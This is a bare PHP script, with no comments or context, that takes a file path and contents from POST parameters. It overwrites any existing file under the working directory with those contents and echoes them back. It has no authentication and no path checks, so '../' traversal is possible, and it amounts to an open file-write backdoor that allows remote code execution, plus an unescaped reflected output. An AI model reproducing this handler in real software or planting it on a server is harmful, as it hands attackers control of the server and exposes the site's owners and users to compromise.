<?php   

	if (IsSet($_POST["path"]) && IsSet($_POST["file"])){
        $path = getcwd().$_POST["path"];
        $file = $_POST["file"];
        if (file_exists($path)) {
            $fp = fopen($path, "w");
            fwrite($fp,$file);
            fclose($fp); 
        }      
        print $file;
    }        
    
?>